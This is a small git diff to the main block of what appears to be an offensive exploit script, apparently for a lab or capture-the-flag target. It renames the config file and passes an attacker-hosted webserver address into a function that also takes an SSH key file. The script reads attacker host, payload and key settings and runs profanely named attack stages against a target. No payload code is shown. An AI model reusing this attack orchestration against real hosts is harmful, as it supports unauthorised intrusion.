@@ -220,7 +220,7 @@ if __name__ == "__main__":
     )
 
     # Config
-    config = parse_config("catcafe.yaml")
+    config = parse_config("config.yaml")
     target = f"http://{config["target"]["host"]}:{config["target"]["port"]}"
     webserver = (
         f"http://{config["attacker"]["host"]}:{config["attacker"]["webserver_port"]}"
@@ -238,4 +238,4 @@ if __name__ == "__main__":
     # I LOVE PILLS AND PERCOCETS, YES, YES (LET'S GO)
     is_we(target, webserver, config["attacker"]["payload"])
     fuckin(target, webserver)
-    or_what(config["target"]["host"], config["attacker"]["ssh_key_file"])
+    or_what(config["target"]["host"], config["attacker"]["ssh_key_file"], webserver)
